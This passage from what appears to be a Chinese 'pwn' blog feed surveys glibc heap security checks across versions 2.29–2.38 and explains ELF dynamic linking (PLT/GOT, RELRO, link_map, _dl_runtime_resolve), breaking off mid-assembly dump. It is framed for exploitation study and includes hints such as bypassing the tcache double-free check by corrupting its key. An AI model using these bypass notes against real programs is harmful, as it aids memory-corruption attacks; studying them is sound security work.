e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = tmp-&gt;next)</span><br><span class="line">      <span class="keyword">if</span> (tmp == e)</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>free时,如果一个chunk的key字段等于tcache,那么就会遍历该tcache链中的所有chunk来判断是否存在double free</p><p><strong>可以通过破坏key绕过</strong></p><h3 id="fglobal-7"><a href="#fglobal-7" class="headerlink" title="+fglobal-7"></a>+fglobal-7</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之前向低地址合并都是不检查即将unlink的chunk的size是否等于找到这个chunk的prev_size</p><p>现在新增了这个检查,使得unlink的利用受到多一点的限制</p><p>向高地址合并则没有变化</p><p>且<strong>宏unlink</strong>现在由<strong>函数unlink_chunk</strong>实现</p><p>但内部具体代码并无明显变化</p><h2 id="附属-2"><a href="#附属-2" class="headerlink" title="附属"></a>附属</h2><h3 id="maco-2"><a href="#maco-2" class="headerlink" title="+maco-2"></a>+maco-2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size in fastbins&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与fglobal-7相同,只不过由malloc_consolidate触发</p><h1 id="glibc2-31"><a href="#glibc2-31" class="headerlink" title="glibc2.31"></a>glibc2.31</h1><h2 id="malloc-2"><a href="#malloc-2" class="headerlink" title="malloc"></a>malloc</h2><h3 id="munsortedbin-3"><a href="#munsortedbin-3" class="headerlink" title="+munsortedbin-3"></a>+munsortedbin-3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><p>当unsortedbin中的chunk放入largebin时,如果要放入的size不小于largebin链中最小的chunk,且size异于largebin链上的所有chunk,则会在插入nextsize链时检测nextsize链完整性</p><h3 id="munsortedbin-4"><a href="#munsortedbin-4" class="headerlink" title="+munsortedbin-4"></a>+munsortedbin-4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><p>当unsortedbin中的chunk放入largebin时,如果要放入的size不小于largebin链中最小的chunk,就会触发fd/bk链的完整性</p><p><strong>这两个检查实际上应该是2.30增加的</strong></p><h2 id="附属-3"><a href="#附属-3" class="headerlink" title="附属"></a>附属</h2><h3 id="tcput-1-1"><a href="#tcput-1-1" class="headerlink" title="-tcput-1"></a>-tcput-1</h3><p>tcache_put中去除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br></pre></td></tr></table></figure><h3 id="tcget-1-1"><a href="#tcget-1-1" class="headerlink" title="-tcget-1"></a>-tcget-1</h3><p>tcache_get中去除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>当然这并不意味着tcache-&gt;entries[tc_idx]== 0是可行的,因为这样的话__libc_malloc根本不会进入tcache_get</p><h1 id="glibc2-32"><a href="#glibc2-32" class="headerlink" title="glibc2.32"></a>glibc2.32</h1><h2 id="malloc-3"><a href="#malloc-3" class="headerlink" title="malloc"></a>malloc</h2><h3 id="mfastbin-2"><a href="#mfastbin-2" class="headerlink" title="+mfastbin-2"></a>+mfastbin-2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim)))</span><br><span class="line">   malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br></pre></td></tr></table></figure><p>fastbin取出chunk时,新增chunk对齐检查</p><h3 id="mfastbin-3"><a href="#mfastbin-3" class="headerlink" title="+mfastbin-3"></a>+mfastbin-3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (pp != <span class="literal">NULL</span> &amp;&amp; misaligned_chunk (pp)))       \</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected&quot;</span>); \</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在REMOVE_FB宏中,新增对齐检测</p><h3 id="mfastbin-4"><a href="#mfastbin-4" class="headerlink" title="+mfastbin-4"></a>+mfastbin-4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br></pre></td></tr></table></figure><p>fastbin填充tcachebin新增对齐检测,会检查每一个chunk是否对齐</p><h2 id="free-2"><a href="#free-2" class="headerlink" title="free"></a>free</h2><h3 id="ftcache-1-1"><a href="#ftcache-1-1" class="headerlink" title="@ftcache-1"></a>@ftcache-1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">  &#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line"> tmp;</span><br><span class="line"> tmp = REVEAL_PTR (tmp-&gt;next))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (tmp)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): unaligned chunk detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (tmp == e)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line"><span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">   few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>判断doublefree时,会检查tcache链上的所有chunk是否对齐</p><h2 id="附属-4"><a href="#附属-4" class="headerlink" title="附属"></a>附属</h2><h3 id="maco-3"><a href="#maco-3" class="headerlink" title="+maco-3"></a>+maco-3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (p)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc_consolidate(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned fastbin chunk detected&quot;</span>);</span><br></pre></td></tr></table></figure><p>每一个fastbin取出时会检查对齐</p><h3 id="tcget-2"><a href="#tcget-2" class="headerlink" title="+tcget-2"></a>+tcget-2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br></pre></td></tr></table></figure><p>tcache_get取出chunk时会有对齐检查</p><h1 id="glibc2-33"><a href="#glibc2-33" class="headerlink" title="glibc2.33"></a>glibc2.33</h1><h2 id="free-3"><a href="#free-3" class="headerlink" title="free"></a>free</h2><h3 id="ftcache-1-2"><a href="#ftcache-1-2" class="headerlink" title="@ftcache-1"></a>@ftcache-1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (cnt &gt;= mp_.tcache_count)</span><br><span class="line">  malloc_printerr (<span class="string">&quot;free(): too many chunks detected in tcache&quot;</span>)</span><br></pre></td></tr></table></figure><p>判断doublefree时,会检查tcache链上的chunk数目是否超过限制</p><p>之前虽然也会与mp_.tcache_count比较,但只是作为一些分支的条件,并不会检查错误</p><p>除此之外tcache_counts几乎没有其他检查了</p><h1 id="glibc2-34"><a href="#glibc2-34" class="headerlink" title="glibc2.34"></a>glibc2.34</h1><p>无显著变化</p><h1 id="glibc2-35"><a href="#glibc2-35" class="headerlink" title="glibc2.35"></a>glibc2.35</h1><p>无显著变化</p><h1 id="glibc2-37"><a href="#glibc2-37" class="headerlink" title="glibc2.37"></a>glibc2.37</h1><p>无显著变化</p><h1 id="glibc2-38"><a href="#glibc2-38" class="headerlink" title="glibc2.38"></a>glibc2.38</h1><h2 id="malloc-4"><a href="#malloc-4" class="headerlink" title="malloc"></a>malloc</h2><h3 id="munsortedbin-2-1"><a href="#munsortedbin-2-1" class="headerlink" title="-munsortedbin-2"></a>-munsortedbin-2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure><p>移除该检查,因为其实前面已经做过一次检查了,这个检查有些重复</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全检查 </tag>
            
            <tag> glibc </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elf动态链接</title>
      <link href="/posts/19785/"/>
      <url>/posts/19785/</url>
      
        <content type="html"><![CDATA[<h1 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h1><h2 id="plt-amp-amp-plt-got-amp-amp-plt-sec"><a href="#plt-amp-amp-plt-got-amp-amp-plt-sec" class="headerlink" title=".plt&amp;&amp;.plt.got&amp;&amp;.plt.sec"></a>.plt&amp;&amp;.plt.got&amp;&amp;.plt.sec</h2><p><strong>所在segment:代码段</strong></p><p><strong>plt表说是表但其实其中的代码都是用来运行的</strong></p><p>PLT : 程序链接表（PLT，Procedure Link Table）</p><p>调用链接器来解析某个外部函数的地址, 并填充到GOT表中, 然后跳转到该函数; 或者直接在GOT中查找并跳转到对应外部函数(如果非首次调用).</p><p>PLT表可能四种情况:</p><ol><li><code>只有.plt</code></li><li><code>`.plt和.plt.got</code></li><li><code>.plt和.plt,sec</code></li><li><code>.plt和.plt,sec和.plt.got</code></li></ol><hr><p>在延迟绑定环境下,每一个函数对应的PLT表项有三个字段</p><ol><li>code:跳转到对应的got表项中的地址</li><li>code:压栈,该参数是对应函数在.rel.plt上的偏移,是写定的</li><li>code:<strong>跳转到公共项plt[0]</strong></li></ol><p><strong>公共项plt[0]处的代码push GOT[1]然后jmp GOT[2]</strong></p><p>在使用了intel cet技术后,在code1和code2字段前会各加一个endbr64指令</p><p>且只要存在<code>.plt.sec</code>节,那么code1一般都位于其中</p><p>code2和code3以及公共项都位于<code>.plt</code>节</p><h2 id="got-amp-amp-got-plt"><a href="#got-amp-amp-got-plt" class="headerlink" title=".got &amp;&amp; .got.plt"></a>.got &amp;&amp; .got.plt</h2><p><strong>所在segment:数据段</strong></p><p>got表就真的只是表了,只存储内容非运行代码</p><p>GOT : 全局偏移表（GOT, Global Offset Table）</p><p>包括了<code>.got</code>和<code>.got.plt</code>.</p><p><strong>有时<code>.got</code>和<code>.got.plt</code>同时存在,有时只有<code>.got</code>,与relro模式相关</strong></p><p>got表相当于plt的GOT全局偏移表, 其内容有两种情况:</p><ol><li>如果在之前查找过该符号, 内容为外部函数的具体地址. </li><li>如果没查找过, 则内容为对应函数PLT表第二个表项的地址.</li></ol><p>在x86架构下, 除了每个函数占用一个GOT表项外，GOT表项还保留了 3个公共表项,  保存在前三个位置, 分别是:</p><ul><li>got[0]: 本ELF动态段(.dynamic段)的装载地址,初始不为空,就位于elf中</li><li>got<a href="http://www.cs.stevens.edu/~jschauma/810/elf.html">1</a>: 本ELF的<code>link_map</code>数据结构描述符地址,初始为空,程序开始前初始化</li><li>got<a href="http://www.cs.dartmouth.edu/~sergey/cs108/dyn-linking-with-gdb.txt">2</a>: <code>_dl_runtime_resolve</code>函数的地址,初始为空,程序开始前初始化</li></ul><p>如果<code>.got</code>和<code>.got.plt</code>同时存在,这三个表项位于<code>.got.plt</code>,否则位于<code>.got</code></p><p><code>FULL RELRO</code>下,got[1]和got[2]不初始化</p><p><code>Partial RELRO</code>和<code>No RELRO</code>则在程序正式开始前由<code>_dl_start_user</code>完成初始化,</p><p>其中, <code>link_map</code>数据结构的定义如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="comment">/* Shared library&#x27;s load address. */</span></span><br><span class="line">ElfW(Addr) l_addr;</span><br><span class="line"><span class="comment">/* Pointer to library&#x27;s name in the string table. */</span>                                    <span class="type">char</span> *l_name;</span><br><span class="line"><span class="comment">/*         Dynamic section of the shared object.</span></span><br><span class="line"><span class="comment">           Includes dynamic linking info etc.</span></span><br><span class="line"><span class="comment">           Not interesting to us.</span></span><br><span class="line"><span class="comment">           */</span>                      </span><br><span class="line">ElfW(Dyn) *l_ld;      </span><br><span class="line"><span class="comment">/* Pointer to previous and next link_map node. */</span>                    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="imapct-of-RELRO"><a href="#imapct-of-RELRO" class="headerlink" title="imapct of RELRO"></a>imapct of RELRO</h2><p>这篇文章讲的动态链接延迟绑定</p><p>是指在RELRO保护为<code>Partial RELRO和No RELRO</code>的情况下部分函数进行的延迟绑定</p><hr><p>当RELRO保护为<code>FULL RELRO</code>的情况下<br>函数的动态链接会在程序进入main之前(start函数中)便完成,所有函数第一次调用时GOT表皆已指向真实函数地址</p><p><code>Parital RELRO和No RELRO</code>下<strong>部分</strong>函数也是这样</p><p>栈回溯如下</p><figure class="highlight plaintext"><figcaption><span>backtrace</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">►  f 0   0x7ffff7fdd80d _dl_relocate_object+3613</span><br><span class="line">   f 1   0x7ffff7fdd80d _dl_relocate_object+3613</span><br><span class="line">   f 2   0x7ffff7fd353a dl_main+8026</span><br><span class="line">   f 3   0x7ffff7febc4b _dl_sysdep_start+1355</span><br><span class="line">   f 4   0x7ffff7fd104c _dl_start+604</span><br><span class="line">   f 5   0x7ffff7fd104c _dl_start+604</span><br><span class="line">   f 6   0x7ffff7fd0108 _dl_start_user</span><br><span class="line">   f 7              0x1</span><br></pre></td></tr></table></figure><h3 id="FULL-RELRO"><a href="#FULL-RELRO" class="headerlink" title="FULL RELRO"></a>FULL RELRO</h3><p>FULL RELRO情况下,一般只会有一个<code>.got</code>节(.got.plt并入其中)</p><p>程序正式进行之前,所有函数的动态链接完成后</p><p><strong>会使用mprotect将<code>.got</code>表所在页的写权限禁止</strong></p><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p><code>Parital RELRO</code>情况下,会有<code>.got</code>节和<code>.got.plt</code>节</p><p>将函数分为两个部分</p><p><code>.got</code>中的函数,在main函数之前完成动态链接,<strong>并由mprotect禁止<code>.got</code>所在页写权限</strong></p><p><code>.got.plt</code>中的函数,则是按照正常的延迟绑定流程进行,并且一直拥有写权限</p><h3 id="No-RELRO"><a href="#No-RELRO" class="headerlink" title="No RELRO"></a>No RELRO</h3><p><code>No RELRO</code>和Parital一样会有<code>.got</code>节和<code>.got.plt</code>节</p><p>函数同样分为两个部分</p><p><code>.got</code>中的函数,同样在main函数之前完成动态链接</p><p><code>.got.plt</code>中的函数,同样按照正常的延迟绑定流程进行</p><p>不同的是,<code>No RELRO</code>不禁止GOT表的任何写权限</p><h2 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h2><p>包含了很多动态链接所需的关键信息，在动态链接中我们主要关注DT_STRTAB, DT_SYMTAB, DT_JMPREL这三项，这三个东西分别包含了指向<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>这3个section的指针</p><p>结构体成员的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Elf64_Dyn struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, align=<span class="number">0x8</span>, copyof_3)</span><br><span class="line"><span class="number">00000000</span>                                        </span><br><span class="line"><span class="number">00000000</span>                                  </span><br><span class="line"><span class="number">00000000</span> d_tag dq ?<span class="comment">//在link_map成员l_info中的下标</span></span><br><span class="line"><span class="number">00000008</span> d_un dq ?</span><br><span class="line"><span class="number">00000010</span> Elf64_Dyn ends</span><br></pre></td></tr></table></figure><p>其中的d_un是个联合体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    Elf64_Xword d_val;</span><br><span class="line">    Elf64_Addr d_ptr;</span><br><span class="line">&#125; d_un;</span><br></pre></td></tr></table></figure><hr><p>除了上述提及的三个成员,.dynamic中还存在不少符号信息(init,fini等等),其中还有一个可能要用到的是DT_DEBUG成员,它指向<strong>_r_debug全局结构体</strong>,在其中能够找到<strong>link_map</strong>地址(一般是其第二个成员)</p><h2 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a>.dynstr</h2><p>一个字符串表,包含着动态链接所需要的符号,表项是字符串以0结尾,当要引用某个字符串时,用的时相对这个secticon头的偏移</p><h2 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h2><p>这个节是一个符号表（结构体数组），里面记录了各种符号的信息，每个表项是一个结构体每个结构体对应一个符号。</p><p>64位和32位中改结构体有些差异,以64位为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Elf64_Sym struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, mappedto_1)</span><br><span class="line"><span class="number">00000000</span>                                      </span><br><span class="line"><span class="number">00000000</span>                                      </span><br><span class="line"><span class="number">00000000</span> st_name dd ?                 <span class="comment">//函数名字符串在.dynstr中的偏移           </span></span><br><span class="line"><span class="number">00000004</span> st_info db ?                <span class="comment">//对导入函数而言,为固定的0x12</span></span><br><span class="line"><span class="number">00000005</span> st_other db ?               <span class="comment">//对导入函数而言,剩下的都为0</span></span><br><span class="line"><span class="number">00000006</span> st_shndx dw ?                </span><br><span class="line"><span class="number">00000008</span> st_value dq ?                          </span><br><span class="line"><span class="number">00000010</span> st_size dq ?</span><br><span class="line"><span class="number">00000018</span> Elf64_Sym ends</span><br></pre></td></tr></table></figure><h2 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h2><p>它是重定位表,也是一个结构体数组，每个项对应一个导入函数。</p><p>64位和32位中改结构体有些差异,以64位为例,结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Elf64_Rela struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, copyof_2)</span><br><span class="line"><span class="number">00000000</span>                                </span><br><span class="line"><span class="number">00000000</span>                                         </span><br><span class="line"><span class="number">00000000</span> r_offset dq ?      <span class="comment">//存储导入函数的got表地址</span></span><br><span class="line"><span class="number">00000008</span> r_info dq ?<span class="comment">//对导入函数而言,该值等于[函数序号&lt;&lt;32]+7  32位下&lt;&lt;8</span></span><br><span class="line"><span class="number">00000010</span> r_addend dq ?<span class="comment">//对导入函数而言为0</span></span><br><span class="line"><span class="number">00000018</span> Elf64_Rela ends</span><br></pre></td></tr></table></figure><h2 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a>link_map</h2><p>对整个elf生命周期都非常重要的一个结构体,结构体非常大,声明有几百行</p><p>详见glibc/include/link.h</p><p>简单看一下常用的几个成员</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> &#123;</span></span><br><span class="line">    Elf64_Addr l_addr;</span><br><span class="line">    <span class="type">char</span> *l_name;</span><br><span class="line">    Elf64_Dyn *l_ld;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    Elf64_Dyn *l_info[<span class="number">77</span>];</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个普通的程序启动后,会有四个link_map结构</p><p>通过l_next和l_prev链接,以l_next为正序的话,四个link_map分别对应</p><p><code>running elf -&gt; vdso -&gt; libc -&gt; ld</code></p><p>link_map用到较多的是l_info,其是一个指针线性表,程序开始时便会用<code>.dynmaic</code>段的表项地址去初始化它,在resolve时会利用这这些指针去访问<code>.dynamic</code>段中的各个表项</p><h1 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h1><p> 整个过程可以概述为</p><h2 id="dl-runtime-resolve-link-map-reloc-arg"><a href="#dl-runtime-resolve-link-map-reloc-arg" class="headerlink" title="_dl_runtime_resolve(link_map,reloc_arg)"></a>_dl_runtime_resolve(link_map,reloc_arg)</h2><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针,初始化时就将<code>.dynamic</code>中的各表项地址用于初始化<code>link_map</code></li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 固定数</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol><hr><p>_dl_runtime_resolve直接由汇编写成,见<code>glibc/sysdeps/x86_64/dl-trampoline.h</code></p><p>不过代码有点难读直接放实际运行时dump下来的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function _dl_runtime_resolve_xsavec:</span><br><span class="line">   0x00007ffff7fe7bc0 &lt;+0&gt;:endbr64 </span><br><span class="line">   0x00007ffff7fe7bc4 &lt;+4&gt;:push   rbx</span><br><span class="line">   0x00007ffff7fe7bc5 &lt;+5&gt;:mov    rbx,rsp</span><br><span class="line">   0x00007ffff7fe7bc8 &lt;+8&gt;:and    rsp,0xffffffffffffffc0</span><br><span class="line">   0x00007ffff7fe7bcc &lt;+12&gt;:sub    rsp,QWORD PTR [rip+0x14b35]        # 0x7ffff7ffc708 &lt;_rtld_global_ro+232&gt;</span><br><span class="line">   0x00007ffff7fe7bd3 &lt;+19&gt;:mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x00007ffff7fe7bd7 &lt;+23&gt;:mov    QWORD PTR [rsp+0x8],rcx</span><br><span class="line">   0x00007ffff7fe7bdc &lt;+28&gt;:mov    QWORD PTR [rsp+0x10],rdx</span><br><span class="line">   0x00007ffff7fe7be1 &lt;+33&gt;:mov    QWORD PTR [rsp+0x18],rsi</span><br><span class="line">   0x00007ffff7fe7be6 &lt;+38&gt;:mov    QWORD PTR [rsp+0x20],rdi</span><br><span class="line">   0x00007ffff7fe7beb &lt;+43&gt;:mov    QWORD PTR [rsp+0x28],r8</span><br><span class="line">   0x00007ffff7fe7bf0 &lt;+48&gt;:mov    QWORD PTR [rsp+0x30],r9</span><br><span class="line">   0x00007ffff7fe7bf5 &lt;+53&gt;:mov    eax,0xee</span><br><span class="line">   0x00007ffff7fe7bfa &lt;+58&gt;:xor    edx,edx</span><br><span class="line">   0x00007ffff7fe7bfc 